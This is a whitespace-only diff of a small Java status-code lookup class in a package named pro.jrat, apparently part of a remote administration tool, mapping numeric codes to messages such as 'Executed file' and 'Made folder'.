@@ -3,9 +3,9 @@ package pro.jrat;
 import java.util.HashMap;
 
 public class Status {
-	
+
 	private static final HashMap<Integer, String> statuses = new HashMap<Integer, String>();
-	
+
 	static {
 		statuses.put(2, "Executed file");
 		statuses.put(3, "Downloading...");
@@ -15,12 +15,12 @@ public class Status {
 		statuses.put(7, "Failed shutdown");
 		statuses.put(8, "Starting shutdown");
 		statuses.put(9, "Executed command");
-    	statuses.put(10, "Made folder");
+		statuses.put(10, "Made folder");
 
 	}
-	
+
 	public static String getStatusFromID(int i) {
 		return statuses.get(i);
 	}
-	
+
 }
